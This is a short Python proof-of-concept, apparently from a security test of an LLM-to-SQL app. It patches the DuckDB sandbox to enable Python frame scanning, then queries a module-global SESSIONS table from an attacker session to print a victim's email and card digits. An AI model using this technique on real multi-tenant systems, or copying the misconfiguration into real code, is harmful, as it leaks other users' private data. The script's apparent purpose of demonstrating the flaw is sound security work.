import sys, duckdb
sys.path.insert(0, "/home/user/Anhad23mahajan/lumen")
import app.main as M
import pandas as pd

M.SESSIONS["victim-sid"] = pd.DataFrame({"secret_customer_email": ["victim@example.com"], "card_last4": ["4242"]})
attacker_df = pd.DataFrame({"product": ["A"], "amount": [1]})

# Monkeypatch run_sql to simulate a MISCONFIGURED deployment that left
# enable_external_access at its default (true) and/or scan_all_frames true,
# while still calling it the same way through the real app.main.ask() -> llm.answer() path.
import app.llm as llm
real_connect = duckdb.connect
def misconfigured_run_sql(df, sql, timeout=10):
    s = llm.guard(sql)
    con = real_connect(":memory:")
    con.register("data", df)
    # MISCONFIGURATION: external access left enabled (e.g. someone "simplifies" the sandbox)
    con.execute("SET python_scan_all_frames=true")
    try:
        return con.execute(f"SELECT * FROM ({s}) LIMIT 1000").df()
    finally:
        con.close()
llm.run_sql = misconfigured_run_sql

def simulate_main_ask(session_id, question_sql):
    df = M.get_df(session_id)
    return llm.run_sql(df, question_sql)

try:
    leaked = simulate_main_ask("attacker-sid" if False else list(M.SESSIONS.keys())[-1], "select * from SESSIONS")
except Exception:
    # attacker doesn't have victim's session id; they use THEIR OWN sid, but SQL
    # references the module-global SESSIONS dict directly (works regardless of whose df is loaded)
    M.SESSIONS["attacker-sid"] = attacker_df
    leaked = simulate_main_ask("attacker-sid", "select * from SESSIONS")
print("Cross-tenant leak via misconfigured replacement scan (external_access left default + scan_all_frames=true):")
print(leaked)
